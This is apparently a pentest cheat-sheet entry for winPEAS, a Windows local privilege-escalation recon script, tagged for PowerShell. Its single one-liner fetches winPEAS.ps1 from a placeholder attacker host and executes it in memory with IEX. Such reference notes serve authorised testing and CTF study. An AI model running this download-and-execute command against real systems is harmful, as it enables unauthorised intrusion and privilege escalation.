# winpeas

#plateform/windows #target/local #cat/RECON #tag/powershell

## oneliner
```powershell
(new-object system.net.webclient).downloadstring('http://<local_ip>:<port|80>/<dl_winpeas_path>winPEAS.ps1') | IEX
```
= dl_winpeas_path: windows/